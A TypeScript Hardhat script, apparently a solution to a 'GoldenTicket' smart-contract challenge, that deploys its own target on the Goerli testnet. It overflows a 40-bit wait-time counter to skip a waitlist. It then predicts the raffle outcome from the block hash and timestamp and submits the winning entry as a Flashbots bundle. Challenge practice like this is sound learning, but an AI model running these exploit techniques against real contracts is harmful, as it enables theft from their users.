import { ethers } from "hardhat";
import {
  FlashbotsBundleProvider,
  FlashbotsBundleResolution,
} from "@flashbots/ethers-provider-bundle";

async function _deploy(contractName: string) {
  const Contract = await ethers.getContractFactory(contractName);

  console.log(`Deploying contract ${contractName}`);
  const contract = await Contract.deploy();
  await contract.deployed();
  console.log(`Contract deployed with address ${contract.address}`);

  return contract;
}

async function main() {
  if (!process.env.GOERLI_RPC_URL) process.exit(1);
  if (!process.env.PRIVATE_KEY) process.exit(1);

  const provider = new ethers.providers.JsonRpcProvider(
    process.env.GOERLI_RPC_URL,
    "goerli"
  );

  const signer = new ethers.Wallet(process.env.PRIVATE_KEY, provider);

  const goldenTicket = await _deploy("GoldenTicket");
  const goldenTicketAttacker = await _deploy("GoldenTicketAttacker");

  const MAX_UINT_40 = 1099511627775;

  console.log("Joining waitlist and breaking wait time...");

  let response = await goldenTicket.joinWaitlist();
  await response.wait(1);

  response = await goldenTicket.updateWaitTime(
    MAX_UINT_40 - (await goldenTicket.waitlist(signer.address)) + 2
  );
  await response.wait(1);

  console.log("Done");

  const authSigner = new ethers.Wallet(
    "0x2000000000000000000000000000000000000000000000000000000000000000",
    provider
  );

  const flashbotsProvider = await FlashbotsBundleProvider.create(
    provider,
    authSigner,
    "https://relay-goerli.flashbots.net",
    "goerli"
  );

  provider.on("block", async (blockNumber) => {
    const gasPrice = await (await provider.getGasPrice())
      .mul(ethers.BigNumber.from("140"))
      .div(ethers.BigNumber.from("100"));

    const block = await provider.getBlock(blockNumber);

    const signedTransactions = await flashbotsProvider.signBundle([
      {
        signer: signer,
        transaction: {
          ...(await goldenTicket.populateTransaction.joinRaffle(
            await goldenTicketAttacker.getRaffleInput(
              ethers.BigNumber.from(block.hash),
              ethers.BigNumber.from(block.timestamp + 12)
            )
          )),
          gasLimit: ethers.BigNumber.from("75000"),
          chainId: 5,
          gasPrice,
        },
      },
    ]);

    console.log(`Submitting bundle for block ${blockNumber + 1}`);

    const bundleSubmission = await flashbotsProvider.sendRawBundle(
      signedTransactions,
      blockNumber + 1
    );

    if ("error" in bundleSubmission) {
      console.log(
        `Something went wrong sending the bundle: ${bundleSubmission.error.message}`
      );
    } else {
      const bundleResolution = await bundleSubmission.wait();
      if (bundleResolution === FlashbotsBundleResolution.BundleIncluded) {
        console.log(`${blockNumber + 1}: Bundle included let's goooo`);
        process.exit(0);
      } else if (
        bundleResolution ===
        FlashbotsBundleResolution.BlockPassedWithoutInclusion
      ) {
        console.log(
          `${blockNumber + 1}: Block wasn't included. Let's keep going...`
        );
      } else if (
        bundleResolution === FlashbotsBundleResolution.AccountNonceTooHigh
      ) {
        console.log(`${blockNumber + 1}: Account nonce too high :(`);
        process.exit(1);
      }
    }
  });
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
